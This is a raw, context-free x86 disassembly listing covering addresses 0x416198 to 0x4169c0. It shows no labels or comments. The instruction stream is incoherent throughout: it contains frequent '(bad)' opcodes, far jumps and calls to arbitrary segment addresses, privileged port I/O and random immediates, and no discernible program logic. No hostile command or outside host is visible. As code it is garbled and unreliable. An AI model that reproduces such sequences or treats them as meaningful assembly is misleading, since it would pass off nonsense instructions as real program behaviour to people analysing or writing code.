  416198:	jb     0x41615c
  41619a:	sub    bl,BYTE PTR [eax]
  41619c:	je     0x4161c3
  41619e:	jp     0x4161d8
  4161a0:	or     BYTE PTR [eax],0x8d
  4161a3:	add    BYTE PTR fs:[eax],al
  4161a6:	add    BYTE PTR [eax],al
  4161a8:	add    BYTE PTR [eax+0x79ffeae5],dl
  4161ae:	cdq    
  4161af:	outs   dx,DWORD PTR ds:[esi]
  4161b0:	inc    esp
  4161b1:	lods   al,BYTE PTR ds:[esi]
  4161b2:	add    DWORD PTR ds:0x4b414000,edx
  4161b8:	rcl    BYTE PTR [edx-0x633b7237],1
  4161be:	jbe    0x416206
  4161c0:	and    al,0x7c
  4161c2:	add    eax,ebp
  4161c4:	push   eax
  4161c5:	pusha  
  4161c6:	js     0x4161bf
  4161c8:	pop    ebx
  4161c9:	sahf   
  4161ca:	or     DWORD PTR [ebx],ecx
  4161cc:	adc    esp,0x6c4c6ff4
  4161d2:	test   eax,0x979d5c92
  4161d7:	add    DWORD PTR [ecx+0x7331e2d3],0xe8b0515a
  4161e1:	rol    BYTE PTR [edi],1
  4161e3:	or     al,0x0
  4161e5:	call   0x904179e5
  4161ea:	mov    esp,0xfe327d7
  4161ef:	or     edi,ebp
  4161f1:	jge    0x4161ea
  4161f3:	std    
  4161f4:	aas    
  4161f5:	nop
  4161f6:	push   ss
  4161f7:	or     eax,0x16cc57ff
  4161fc:	jg     0x416219
  4161fe:	cmp    bh,ah
  416200:	sbb    edi,DWORD PTR [eax]
  416202:	aas    
  416203:	arpl   di,di
  416205:	aas    
  416206:	mov    ecx,0x9ed65dca
  41620b:	and    eax,0x89
  416210:	add    BYTE PTR [eax],al
  416212:	xor    eax,0x9004cc87
  416217:	dec    eax
  416218:	pop    DWORD PTR [ebx+eax*8-0x42]
  41621c:	cmp    BYTE PTR [ebp+0x5],dl
  41621f:	mov    dh,ah
  416221:	pop    ss
  416222:	pusha  
  416223:	add    al,0x17
  416225:	and    al,0x64
  416227:	mov    dl,0x9d
  416229:	in     al,0x6
  41622b:	(bad)  
  41622c:	(bad)  
  41622d:	rcr    al,1
  41622f:	daa    
  416230:	sub    eax,ebp
  416232:	lahf   
  416233:	sub    esp,DWORD PTR [ecx]
  416235:	call   0x2ac22cbd
  41623a:	(bad)  
  41623c:	jge    0x416285
  41623e:	lods   al,BYTE PTR ds:[esi]
  41623f:	jp     0x4162a3
  416241:	ret    
  416242:	inc    ebx
  416243:	ret    0xb1b4
  416246:	push   edx
  416247:	daa    
  416248:	mov    ecx,0xf4caa7e7
  41624d:	sub    DWORD PTR [edi-0x4654952b],esi
  416253:	push   esp
  416254:	ins    BYTE PTR es:[edi],dx
  416255:	(bad)  
  416257:	ret    0xc9db
  41625a:	or     dl,cl
  41625c:	mov    es,WORD PTR [esi+0x7ef25e95]
  416262:	add    BYTE PTR [ebp+0x641b8ccb],bl
  416268:	aaa    
  416269:	jle    0x41624f
  41626b:	mov    es,ebp
  41626d:	fwait
  41626e:	xchg   edx,eax
  41626f:	mov    ah,0xe5
  416271:	add    edx,DWORD PTR [ebx]
  416273:	repnz cdq 
  416275:	test   BYTE PTR [eax],0x0
  416278:	add    BYTE PTR [eax],al
  41627a:	add    ch,ch
  41627c:	sub    edi,ebx
  41627e:	and    eax,0x3dc96e99
  416283:	jecxz  0x41622e
  416285:	jg     0x4162ff
  416287:	(bad)  
  416288:	mov    al,0x87
  41628a:	enter  0x8ed3,0x35
  41628e:	adc    BYTE PTR [esi+0x6f],bh
  416291:	fs ret 0x997a
  416295:	enter  0x5f16,0x48
  416299:	sbb    ebp,DWORD PTR [edx]
  41629b:	mov    ecx,0xb320ad5
  4162a0:	outs   dx,BYTE PTR ds:[esi]
  4162a1:	or     eax,ebp
  4162a3:	(bad)  
  4162a4:	daa    
  4162a5:	push   cs
  4162a6:	sbb    eax,0x1d81bcf0
  4162ab:	lock je 0x416233
  4162ae:	and    eax,0x9ae6bcf0
  4162b3:	dec    edi
  4162b4:	aad    0xee
  4162b6:	ins    BYTE PTR es:[edi],dx
  4162b7:	aam    0x5d
  4162b9:	sbb    DWORD PTR [edx+0x50],esp
  4162bc:	mov    ds,WORD PTR [esi]
  4162be:	mov    edx,0x72f7df25
  4162c3:	cwde   
  4162c4:	mov    ss,WORD PTR [esi+0x62]
  4162c7:	add    al,0xca
  4162c9:	xchg   esp,eax
  4162ca:	adc    BYTE PTR [ebp+0x3f4184b2],cl
  4162d0:	data16 sub al,cl
  4162d3:	sbb    edi,DWORD PTR [ebp+0x4b]
  4162d6:	call   0x5838c6e
  4162db:	mov    al,ds:0xb4c6cc
  4162e0:	add    BYTE PTR [eax],al
  4162e2:	add    BYTE PTR [eax],al
  4162e4:	xchg   esp,eax
  4162e5:	mov    dl,0x84
  4162e7:	sub    ch,BYTE PTR [ebx+0x74]
  4162ea:	push   ecx
  4162eb:	xchg   edx,eax
  4162ec:	push   ss
  4162ed:	out    dx,eax
  4162ee:	dec    ecx
  4162ef:	sub    edx,DWORD PTR [eax+0x187259b2]
  4162f5:	xor    ch,dl
  4162f7:	and    DWORD PTR [edi],ecx
  4162f9:	(bad)  
  4162fa:	jno    0x4162b6
  4162fc:	mov    eax,ds:0x6fc5422b
  416301:	jg     0x41633e
  416303:	and    bl,cl
  416305:	data16 sub bl,ch
  416308:	(bad)  
  416309:	fadd   DWORD PTR [ebp+edx*4-0x2e197391]
  416310:	je     0x4162e5
  416312:	out    dx,al
  416313:	jb     0x416338
  416315:	xor    al,bh
  416317:	out    dx,al
  416318:	mov    bh,0x69
  41631a:	or     eax,0x422993e9
  41631f:	add    eax,0x4a292c
  416324:	lea    ebx,[edx-0x29a300a2]
  41632a:	test   edi,edx
  41632c:	sar    eax,1
  41632e:	idiv   bh
  416330:	ss push ebp
  416332:	dec    edx
  416333:	and    al,0x95
  416335:	push   ebx
  416336:	fisttp QWORD PTR [eax-0x76e22d4b]
  41633c:	lods   eax,DWORD PTR ds:[esi]
  41633d:	ror    BYTE PTR [esi],cl
  41633f:	mov    DWORD PTR [ebp+0x29851ad2],ebp
  416345:	(bad)  [edx+0x17]
  41634b:	add    BYTE PTR [eax],al
  41634d:	call   0xf1cc7201
  416352:	mov    ah,0xc7
  416354:	cmp    bh,BYTE PTR [edx-0x72b378e7]
  41635a:	rol    BYTE PTR [ebx+0x405aad5e],cl
  416360:	cmp    dh,BYTE PTR [eax]
  416362:	mov    ebp,DWORD PTR [edx]
  416364:	sbb    BYTE PTR [edx],dh
  416366:	mov    ebp,DWORD PTR [edx]
  416368:	and    al,0x22
  41636a:	sub    DWORD PTR [edi+0x68ca8d4c],eax
  416370:	add    DWORD PTR ds:0x79008cf4,0xffffffaf
  416377:	push   cs
  416378:	je     0x4163f9
  41637a:	xchg   ecx,eax
  41637b:	test   DWORD PTR [ebp+ecx*2+0x79000e2d],eax
  416382:	xchg   ecx,eax
  416383:	aaa    
  416384:	inc    edi
  416385:	aas    
  416386:	push   esp
  416387:	dec    edx
  416388:	and    al,0x3d
  41638a:	fmul   DWORD PTR [ebx+0xeaf69a6]
  416390:	mov    dx,0x2a6b
  416394:	test   BYTE PTR [ecx],bh
  416396:	scas   eax,DWORD PTR es:[edi]
  416397:	push   cs
  416398:	add    ch,bl
  41639a:	loopne 0x416404
  41639c:	mov    ebp,DWORD PTR [ebp-0x6fff752e]
  4163a2:	leave  
  4163a3:	or     ah,BYTE PTR [esi+0x69]
  4163a6:	mov    edx,es
  4163a8:	mov    ah,dl
  4163aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4163ab:	dec    BYTE PTR [ecx*1+0xa4e]
  4163b2:	add    BYTE PTR [eax],al
  4163b4:	add    BYTE PTR [eax],al
  4163b6:	nop
  4163b7:	dec    esi
  4163b8:	dec    esi
  4163b9:	and    al,0x60
  4163bb:	mov    ecx,0xe554c52c
  4163c0:	fidivr DWORD PTR [edx+ebp*4]
  4163c3:	bound  ecx,QWORD PTR [esi+0x24]
  4163c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4163c7:	cmp    al,0xdf
  4163c9:	imul   eax,DWORD PTR [edx+0x54870a89],0xffffffe5
  4163d0:	mov    esi,0xe2ed4c88
  4163d5:	dec    edi
  4163d6:	sbb    DWORD PTR [ebp-0x238c412],eax
  4163dc:	push   ss
  4163dd:	adc    dl,BYTE PTR [eax-0x37]
  4163e0:	ja     0x41642e
  4163e2:	ins    BYTE PTR es:[edi],dx
  4163e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4163e4:	jae    0x41642a
  4163e6:	je     0x4163a5
  4163e8:	int    0x44
  4163ea:	ins    BYTE PTR es:[edi],dx
  4163eb:	adc    DWORD PTR [esi],ecx
  4163ed:	add    BYTE PTR [eax+0x21f192c9],dl
  4163f3:	xchg   esp,eax
  4163f4:	test   DWORD PTR [eax+edx*2-0x79c721f0],eax
  4163fb:	push   cs
  4163fc:	test   DWORD PTR [eax+0x50e6ffe4],0x4f92a10b
  416406:	rcr    edx,cl
  416408:	or     cl,BYTE PTR [ecx-0x77210834]
  41640e:	(bad)  
  41640f:	(bad)  
  416410:	jmp    0xbc80:0xe6f7c488
  416417:	jmp    edx
  416419:	cmp    DWORD PTR [eax],eax
  41641b:	add    BYTE PTR [eax],al
  41641d:	add    BYTE PTR [eax],al
  41641f:	fcomp  DWORD PTR [ecx+edx*4+0x3a]
  416423:	retf   0x64b2
  416426:	cwde   
  416427:	jp     0x416464
  416429:	sub    eax,esp
  41642b:	xor    DWORD PTR ds:0x774dcdce,0x9
  416432:	cmc    
  416433:	push   ds
  416434:	(bad)  
  416436:	jl     0x416404
  416438:	xchg   esi,eax
  416439:	fnstcw WORD PTR [esp+eiz*2-0x6a]
  41643d:	add    eax,0xc196547d
  416442:	test   BYTE PTR [esi+edx*4+0xd],dl
  416446:	into   
  416447:	push   ecx
  416448:	xor    eax,0xfa10cda6
  41644d:	fidivr DWORD PTR [edx+0x3c]
  416450:	xchg   esi,eax
  416451:	lds    edi,FWORD PTR [edx+0x4c]
  416454:	xchg   esi,eax
  416455:	jmp    0x64032c26
  41645a:	out    0xcc,al
  41645c:	shl    DWORD PTR [edi-0x7d],1
  41645f:	inc    esp
  416460:	xchg   esi,eax
  416461:	aam    0x3
  416463:	sub    dh,BYTE PTR [edx+0x3d890fcc]
  416469:	xor    eax,0xe8dade7c
  41646e:	sub    esp,DWORD PTR [edi+0x9ab6ad1]
  416474:	add    DWORD PTR [ebp-0x47],ebx
  416477:	push   edi
  416478:	mov    bl,0xe5
  41647a:	jbe    0x416458
  41647c:	xchg   esi,eax
  41647d:	or     eax,0xe67ec49c
  416482:	add    eax,DWORD PTR [eax]
  416484:	add    BYTE PTR [eax],al
  416486:	add    BYTE PTR [eax],al
  416488:	or     dh,ch
  41648a:	(bad)  
  41648b:	sub    ecx,ebx
  41648d:	cmp    eax,0xb652260a
  416492:	in     eax,0x30
  416494:	sbb    esp,ecx
  416496:	imul   edi,DWORD PTR [edx+0x27b60e4],0x1b78f20c
  4164a0:	and    esp,0xc4c49f0d
  4164a6:	xor    DWORD PTR [ecx+0x2884c18e],edi
  4164ac:	lea    ecx,[esi-0x716faa8a]
  4164b2:	push   esi
  4164b3:	pop    esp
  4164b4:	es pop ebx
  4164b6:	or     ch,BYTE PTR [edx+0x55]
  4164b9:	mov    ah,0x50
  4164bb:	sbb    bl,BYTE PTR [edx+0x442a81a9]
  4164c1:	mov    es,WORD PTR ds:0xec10053e
  4164c7:	in     eax,0x9d
  4164c9:	xor    esp,esp
  4164cb:	fstp   DWORD PTR [edx]
  4164cd:	mov    al,0x81
  4164cf:	sub    dl,BYTE PTR [edi-0x72]
  4164d2:	or     DWORD PTR [esi],ebx
  4164d4:	in     eax,0xf
  4164d6:	in     al,dx
  4164d7:	in     eax,0x7d
  4164d9:	xor    esp,esp
  4164db:	mov    esi,0x2a81bffa
  4164e0:	aaa    
  4164e1:	mov    cs,WORD PTR [ecx]
  4164e3:	(bad)  
  4164e4:	mov    bh,0xf
  4164e6:	in     al,dx
  4164e7:	in     eax,0x9d
  4164e9:	xor    esp,esp
  4164eb:	mov    esi,0x0
  4164f0:	add    BYTE PTR [ebp-0x71d54f41],dl
  4164f6:	mov    bl,0xde
  4164f8:	out    0x56,al
  4164fa:	in     al,0x4c
  4164fc:	inc    edx
  4164fd:	shl    DWORD PTR ds:0xb387a2d3,cl
  416503:	mov    ebp,DWORD PTR [edi]
  416505:	xchg   ebp,eax
  416506:	cmp    eax,ecx
  416508:	xchg   edi,eax
  416509:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41650a:	aaa    
  41650b:	pop    ss
  41650c:	mov    ss,WORD PTR [edx-0x7e]
  41650f:	into   
  416510:	xchg   ebx,eax
  416511:	jnp    0x416569
  416513:	test   esi,esp
  416515:	mov    ebx,0xeabecb6d
  41651a:	int3   
  41651b:	mov    BYTE PTR [eax],ah
  41651d:	and    BYTE PTR [esi-0x7c],0x0
  416521:	push   0xff74ce50
  416526:	in     al,0xdc
  416528:	push   esi
  416529:	mov    dl,0x24
  41652b:	xor    ch,BYTE PTR ds:0x264b2c4
  416531:	iret   
  416532:	sub    edx,DWORD PTR [edi]
  416534:	cmp    al,0x82
  416536:	mov    eax,ds:0xf82aeb18
  41653b:	aaa    
  41653c:	jg     0x416565
  41653e:	lods   eax,DWORD PTR ds:[esi]
  41653f:	fmul   QWORD PTR [edx]
  416541:	(bad)  
  416542:	pop    esi
  416543:	push   0x68e3e383
  416548:	add    ebp,DWORD PTR [ecx]
  41654a:	leave  
  41654b:	mov    ecx,0xef4ca8d2
  416550:	cmp    ebx,ecx
  416552:	mov    edx,0x84e8
  416557:	add    BYTE PTR [eax],al
  416559:	add    BYTE PTR [ecx],bh
  41655b:	ror    BYTE PTR ds:0x85b72f83,0xca
  416562:	push   es
  416563:	pop    ds
  416564:	test   esi,eax
  416566:	fiadd  WORD PTR [eax+0xe860fdc]
  41656c:	sub    al,BYTE PTR [edx]
  41656e:	scas   al,BYTE PTR es:[edi]
  41656f:	jb     0x416530
  416571:	mov    esi,edi
  416573:	xchg   ebp,eax
  416574:	push   0xcd98b689
  416579:	xor    edi,DWORD PTR [ecx-0x57]
  41657c:	push   es
  41657d:	data16 xor al,dl
  416580:	push   esi
  416581:	pop    edi
  416582:	push   0xffffffe4
  416584:	(bad)  
  416585:	push   0xffffffa1
  416587:	dec    esp
  416588:	scas   eax,DWORD PTR es:[edi]
  416589:	pop    edx
  41658a:	and    DWORD PTR [esi+0x2ba8097a],esi
  416590:	cmp    esp,DWORD PTR [eax]
  416592:	jmp    0xe606:0x6bebe37b
  416599:	dec    edx
  41659a:	add    al,0x25
  41659c:	xchg   DWORD PTR [eax+edx*4],eax
  41659f:	push   esi
  4165a0:	imul   esi,DWORD PTR [esp+edx*8-0x27],0x49
  4165a5:	jg     0x416600
  4165a7:	(bad)  [ecx]
  4165a9:	add    BYTE PTR [eax-0x6e4f5db5],dl
  4165af:	pushf  
  4165b0:	and    DWORD PTR [ebp+0xb],edx
  4165b3:	retf   0xfcdc
  4165b6:	jns    0x41654f
  4165b8:	call   FWORD PTR [ecx]
  4165ba:	mov    eax,0xa99
  4165bf:	add    BYTE PTR [eax],al
  4165c1:	add    BYTE PTR [eax],al
  4165c3:	and    BYTE PTR [ebx+0xb],dh
  4165c6:	push   ebp
  4165c7:	mov    DWORD PTR [edi-0x1673ec77],0x1915004a
  4165d1:	inc    DWORD PTR ds:0xbfdcc719
  4165d7:	jmp    0x4165b3
  4165d9:	pop    edx
  4165da:	call   DWORD PTR [esi+0x77]
  4165dd:	int    0x89
  4165df:	push   esp
  4165e0:	cmc    
  4165e1:	out    dx,al
  4165e2:	push   ebp
  4165e3:	sbb    ebp,DWORD PTR [edx]
  4165e5:	jae    0x41662d
  4165e7:	mov    BYTE PTR [ecx+0x5c897432],dl
  4165ed:	sar    bh,1
  4165ef:	adc    dh,BYTE PTR [edi-0x6044fff2]
  4165f5:	lea    ecx,[esi]
  4165f7:	mov    edi,0x1297ef46
  4165fc:	sbb    eax,0x9424ff0b
  416601:	cmp    eax,0x8ce0e755
  416606:	inc    esp
  416607:	nop
  416608:	or     BYTE PTR [edx+0x4aeaa013],cl
  41660e:	add    BYTE PTR [edx],bl
  416610:	out    dx,eax
  416611:	bound  eax,QWORD PTR [edx-0x3e7f2434]
  416617:	xchg   ecx,eax
  416618:	push   es
  416619:	in     al,0xe7
  41661b:	jmp    0x2537:0x6d8528b2
  416622:	adc    BYTE PTR [eax+0x67c231],al
  416628:	add    BYTE PTR [eax],al
  41662a:	add    BYTE PTR [eax],al
  41662c:	adc    dh,BYTE PTR [edi-0x1b]
  41662f:	add    edx,DWORD PTR [eax]
  416631:	cli    
  416632:	in     eax,0x7b
  416634:	stos   DWORD PTR es:[edi],eax
  416635:	sub    ah,BYTE PTR [ebx+0x40]
  416638:	nop
  416639:	gs clc 
  41663b:	out    dx,al
  41663c:	aaa    
  41663d:	mov    eax,ds:0x69d503a5
  416642:	jl     0x416601
  416644:	into   
  416645:	lock call 0xd67b244e
  41664b:	js     0x416623
  41664d:	mov    edx,0xac9c3c2d
  416652:	fs add eax,0xfb39b294
  416658:	add    al,0x45
  41665a:	loope  0x4165e0
  41665c:	mov    ds:0x9043d5a2,eax
  416661:	xor    edi,esp
  416663:	add    esp,DWORD PTR [eax+edi*4+0x1b]
  416667:	add    al,0xe5
  416669:	test   BYTE PTR [eax+0x25a297ee],bl
  41666f:	add    al,0x36
  416671:	icebp  
  416672:	adc    DWORD PTR [ecx-0x44],edi
  416675:	popa   
  416676:	pop    ss
  416677:	jns    0x416630
  416679:	gs ins BYTE PTR es:[edi],dx
  41667b:	cmp    eax,0x102d7a88
  416680:	push   esp
  416681:	ficom  DWORD PTR [ecx]
  416683:	test   DWORD PTR [ebp+0x23c368cd],ebp
  416689:	mov    dh,0x13
  41668b:	les    ebp,FWORD PTR [ecx+0x55248]
  416691:	add    BYTE PTR [eax],al
  416693:	add    BYTE PTR [eax],al
  416695:	mov    WORD PTR [ecx+0x47acca2c],es
  41669b:	add    BYTE PTR [ecx-0x32],bh
  41669e:	mov    edx,0x4651020e
  4166a3:	jmp    DWORD PTR [eax-0x1249487a]
  4166a9:	adc    esi,DWORD PTR [edx+0x3a69120e]
  4166af:	dec    ecx
  4166b0:	in     eax,0xf8
  4166b2:	mov    al,0xb6
  4166b4:	jmp    0x6380:0x9e0eb213
  4166bb:	pop    esi
  4166bc:	(bad)  
  4166bd:	push   esp
  4166be:	into   
  4166bf:	sbb    ch,ah
  4166c1:	inc    ebx
  4166c2:	lea    ecx,[esi]
  4166c4:	fs push ebx
  4166c6:	inc    ecx
  4166c7:	or     dh,BYTE PTR [eax+0x73]
  4166ca:	fcmovne st,st(1)
  4166cc:	cmp    dl,BYTE PTR [ebx]
  4166ce:	inc    ecx
  4166cf:	add    dl,dh
  4166d1:	sbb    DWORD PTR [ebp-0x5eece911],esi
  4166d7:	sbb    bl,cl
  4166d9:	ror    esp,cl
  4166db:	inc    esi
  4166dc:	mov    dh,0x64
  4166de:	stos   DWORD PTR es:[edi],eax
  4166df:	into   
  4166e0:	sub    DWORD PTR [edi-0x65],ebp
  4166e3:	sbb    edi,0xffffffbe
  4166e6:	loopne 0x41671c
  4166e8:	cmp    al,0x80
  4166ea:	inc    esp
  4166eb:	adc    BYTE PTR [edx-0x6f],dh
  4166ee:	mov    edx,0x88885eff
  4166f3:	cmp    ebp,DWORD PTR [eax-0x16f23057]
  4166f9:	add    BYTE PTR [eax],al
  4166fb:	add    BYTE PTR [eax],al
  4166fd:	add    BYTE PTR [ebx+0x7ef1e50d],dl
  416703:	mov    esi,0x70b84989
  416708:	push   cs
  416709:	sub    esi,DWORD PTR [edi+0x61]
  41670c:	add    bl,bl
  41670e:	cmp    BYTE PTR ds:0x6f8d9900,dh
  416714:	push   eax
  416715:	mov    dl,0xb0
  416717:	repnz add eax,0xe239b8e9
  41671d:	add    BYTE PTR [eax],ch
  41671f:	cmp    eax,0x231f083f
  416724:	dec    esp
  416725:	push   DWORD PTR [ecx]
  416727:	les    ecx,FWORD PTR [ecx-0x7d]
  41672a:	shl    DWORD PTR [esi-0x34dcf386],cl
  416730:	or     ch,BYTE PTR [edx+0x5d]
  416733:	pop    ebp
  416734:	or     DWORD PTR [ebx+0x6e54bfc],ecx
  41673a:	adc    esp,DWORD PTR [eax+0x4bcc8950]
  416740:	lea    edi,[ecx+0x2d]
  416743:	mov    al,0x7a
  416745:	adc    esi,DWORD PTR es:[eax-0x1fdaba7d]
  41674c:	icebp  
  41674d:	jne    0x416770
  41674f:	fimul  WORD PTR [edi+edi*8]
  416752:	enter  0xf1ba,0x15
  416756:	mov    ebp,0x7a004ea6
  41675b:	jge    0x41678c
  41675d:	cmp    edi,DWORD PTR [eax]
  41675f:	retf   
  416760:	or     edi,DWORD PTR [ecx]
  416762:	add    BYTE PTR [eax],al
  416764:	add    BYTE PTR [eax],al
  416766:	add    BYTE PTR [edx+esi*1+0x7efa027a],bh
  41676d:	test   cl,al
  41676f:	shl    BYTE PTR [eax-0x42fd3fc4],cl
  416775:	test   DWORD PTR [ecx],ecx
  416777:	(bad)  
  416778:	cli    
  416779:	push   es
  41677a:	neg    DWORD PTR [eax]
  41677c:	aas    
  41677d:	push   es
  41677e:	mov    al,0xe8
  416780:	rol    edi,1
  416782:	ret    0xafc1
  416785:	pop    ebx
  416786:	mov    edx,DWORD PTR ds:0x9a0ce235
  41678c:	call   0x4ad5f4d0
  416791:	test   edx,esi
  416793:	inc    ecx
  416794:	shl    al,cl
  416796:	inc    DWORD PTR [esi+0x22]
  416799:	inc    ebx
  41679a:	hlt    
  41679b:	nop
  41679c:	test   BYTE PTR fs:[ebx],0x97
  4167a0:	out    0x2,al
  4167a2:	call   0xfdcddb14
  4167a7:	or     al,0x99
  4167a9:	not    DWORD PTR [ecx]
  4167ab:	loope  0x4167d8
  4167ad:	sahf   
  4167ae:	dec    ebx
  4167af:	jl     0x416822
  4167b1:	(bad)  
  4167b3:	outs   dx,DWORD PTR ds:[esi]
  4167b4:	xchg   esp,eax
  4167b5:	xchg   eax,eax
  4167b7:	(bad)  
  4167b9:	mov    bh,0xff
  4167bb:	push   0xffffffd7
  4167bd:	cmp    cl,bl
  4167bf:	add    eax,0x23e8772e
  4167c4:	mov    bl,0x8c
  4167c6:	std    
  4167c7:	sbb    bl,BYTE PTR [eax+0x58ed]
  4167cd:	add    BYTE PTR [eax],al
  4167cf:	add    BYTE PTR [ecx-0x69],cl
  4167d2:	add    eax,DWORD PTR [eax]
  4167d4:	ficom  WORD PTR [eax+0x7a]
  4167d7:	mov    esi,ebx
  4167d9:	leave  
  4167da:	inc    ebp
  4167db:	push   es
  4167dc:	sub    BYTE PTR [ecx-0x36],al
  4167df:	push   DWORD PTR [edi]
  4167e1:	dec    esp
  4167e2:	dec    esp
  4167e3:	call   DWORD PTR [edi]
  4167e5:	push   eax
  4167e6:	pop    esp
  4167e7:	call   0x4cad29
  4167ec:	(bad)  
  4167ed:	xchg   esp,eax
  4167ee:	or     BYTE PTR es:[ecx-0x3976fa73],dl
  4167f5:	lock xchg DWORD PTR [esi],edi
  4167f8:	xchg   ecx,eax
  4167f9:	fld    DWORD PTR [ecx+0x61746c6]
  4167ff:	add    BYTE PTR [ebx],dl
  416801:	xor    eax,0x843d511a
  416806:	xor    edi,0xd9382683
  41680c:	mov    DWORD PTR [esi+ebx*1+0xa6e160d],edi
  416813:	add    BYTE PTR [eax-0x3dceb4f8],dl
  416819:	mov    cl,0x7e
  41681b:	enter  0xbe73,0xa3
  41681f:	(bad)  [eax]
  416821:	inc    ebx
  416822:	in     eax,dx
  416823:	add    al,0xa0
  416825:	mov    bh,dh
  416827:	idiv   bh
  416829:	cmp    eax,0x4f11079f
  41682e:	or     DWORD PTR [eax],ebx
  416830:	nop
  416831:	xor    eax,0x27c1
  416836:	add    BYTE PTR [eax],al
  416838:	add    BYTE PTR [eax-0x4c179b4e],bl
  41683e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41683f:	in     eax,0x34
  416841:	dec    edi
  416842:	xor    ebp,ebp
  416844:	ror    DWORD PTR [esi+ebx*1-0x4ab07ada],cl
  41684b:	mov    dh,0xd5
  41684d:	dec    esp
  41684e:	inc    ecx
  41684f:	aad    0x8e
  416851:	aam    0x8e
  416853:	lds    eax,FWORD PTR [eax+0x7064b6c6]
  416859:	test   cl,cl
  41685b:	jbe    0x416868
  41685d:	sub    eax,0x166bf542
  416862:	xchg   ecx,eax
  416863:	jecxz  0x416868
  416865:	or     BYTE PTR [ecx+0x1],dh
  416868:	mov    BYTE PTR [eax+0x3f],dl
  41686b:	add    eax,DWORD PTR [ecx-0x70fe717c]
  416871:	push   esp
  416872:	mov    gs,ebp
  416874:	jmp    0x416875
  416876:	leave  
  416877:	adc    al,0x4
  416879:	push   0xffffffb2
  41687b:	int    0xa9
  41687d:	mov    ah,0xb4
  41687f:	in     eax,0x10
  416881:	push   ds
  416882:	out    dx,al
  416883:	push   0x6db36a43
  416888:	leave  
  416889:	mov    bl,0x6a
  41688b:	rol    dh,1
  41688d:	out    0x37,eax
  41688f:	cmp    DWORD PTR [eax],ebp
  416891:	pushf  
  416892:	fimul  DWORD PTR [eax+0x25]
  416895:	xchg   edx,eax
  416896:	mov    dl,0xe
  416898:	(bad)  
  416899:	iret   
  41689a:	xchg   ebp,eax
  41689b:	push   ds
  41689c:	mov    edx,0x0
  4168a1:	add    BYTE PTR [ebp+0x74],al
  4168a4:	dec    ecx
  4168a5:	push   0x53
  4168a7:	call   0xc633:0xa277a585
  4168ae:	xchg   DWORD PTR [edi-0x38ef2874],esi
  4168b4:	out    dx,al
  4168b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4168b6:	jo     0x416924
  4168b8:	test   BYTE PTR [edx],ch
  4168ba:	pop    esp
  4168bb:	xor    cl,dl
  4168bd:	fxch   st(5)
  4168bf:	scas   al,BYTE PTR es:[edi]
  4168c0:	push   cs
  4168c1:	xchg   edi,eax
  4168c2:	sbb    al,0xd9
  4168c4:	mov    ah,BYTE PTR [edi-0x51]
  4168c7:	mov    ah,0xe
  4168c9:	jmp    0x8166ae61
  4168ce:	xchg   ebx,eax
  4168cf:	mov    edx,0xc93de90e
  4168d4:	out    dx,eax
  4168d5:	mov    esp,0xe94a337b
  4168da:	adc    BYTE PTR [ebp-0x36ac248a],ah
  4168e0:	test   DWORD PTR [edi+0x77],esp
  4168e3:	mov    ah,0xe
  4168e5:	jmp    0xedba5b02
  4168ea:	sub    DWORD PTR [ecx-0x5fa00311],esi
  4168f0:	dec    esi
  4168f1:	jmp    0xaa915bb7
  4168f6:	cmp    al,0xc9
  4168f8:	push   eax
  4168f9:	stos   BYTE PTR es:[edi],al
  4168fa:	out    0xc5,al
  4168fc:	jns    0x41690b
  4168fe:	mov    al,ds:0xe8aefd3b
  416903:	xchg   esp,eax
  416904:	add    dl,BYTE PTR [ecx+0x0]
  41690a:	add    BYTE PTR [esi],ch
  41690c:	push   ecx
  41690d:	or     eax,0xc6f2a2e9
  416912:	out    dx,eax
  416913:	xchg   ebx,eax
  416914:	xor    DWORD PTR [esi-0x17],ecx
  416917:	sbb    al,0x70
  416919:	sbb    al,BYTE PTR [eax]
  41691b:	inc    eax
  41691c:	xor    BYTE PTR [edx],dl
  41691e:	add    DWORD PTR [ecx-0x3a79784c],ebp
  416924:	mov    dl,0xe
  416926:	add    BYTE PTR [eax],dh
  416928:	xor    BYTE PTR [esi],ah
  41692a:	add    bh,BYTE PTR [ecx-0x20397a4c]
  416930:	jb     0x416938
  416932:	add    bh,dl
  416934:	cmp    ebx,edi
  416936:	call   0x501dc0
  41693b:	(bad)  
  41693c:	cli    
  41693d:	sub    cl,BYTE PTR [eax]
  41693f:	push   0xaf8b09c0
  416944:	push   esi
  416945:	dec    ebx
  416946:	cmp    eax,0xc685b478
  41694b:	dec    edi
  41694c:	jb     0x416958
  41694e:	add    BYTE PTR [edi],ah
  416950:	cmp    eax,0x9aef8bdf
  416955:	or     al,0x0
  416957:	cmp    DWORD PTR [ecx+0x8],esi
  41695a:	add    al,al
  41695c:	out    dx,al
  41695d:	out    dx,al
  41695e:	out    0x62,eax
  416960:	jae    0x416951
  416962:	jmp    DWORD PTR [esi-0x50]
  416965:	jp     0x41690a
  416967:	stc    
  416968:	mov    bl,0x85
  41696a:	into   
  41696b:	iret   
  41696c:	push   ebp
  41696d:	ins    BYTE PTR es:[edi],dx
  41696e:	imul   eax,DWORD PTR [eax],0x0
  416971:	add    BYTE PTR [eax],al
  416973:	add    BYTE PTR [eax],ch
  416975:	mov    ah,0x5d
  416977:	mov    ebx,DWORD PTR [ebp-0x66]
  41697a:	push   ds
  41697b:	push   esi
  41697c:	jb     0x4169bc
  41697e:	clc    
  41697f:	ret    
  416980:	clc    
  416981:	mov    edi,0x48e569ff
  416986:	jp     0x4169ac
  416988:	fldenv [edx]
  41698a:	sbb    BYTE PTR [eax+edi*8],0xb3
  41698e:	push   cs
  41698f:	call   0x31211f
  416994:	pop    es
  416995:	jne    0x4169a3
  416997:	je     0x416929
  416999:	test   DWORD PTR [ebx-0x7a368bbc],0x8bbf3cc0
  4169a3:	rcl    BYTE PTR [ecx+ebp*4+0x319c4e9d],0x28
  4169ab:	or     eax,0x1063d991
  4169b0:	cmp    al,ch
  4169b2:	bound  esi,QWORD PTR [edi]
  4169b4:	adc    ebx,ebx
  4169b6:	or     dl,BYTE PTR [eax+0x5]
  4169b9:	adc    BYTE PTR [edi],dl
  4169bb:	call   0x4b5297
  4169c0:	sbb    DWORD PTR [edi+0x23],ecx
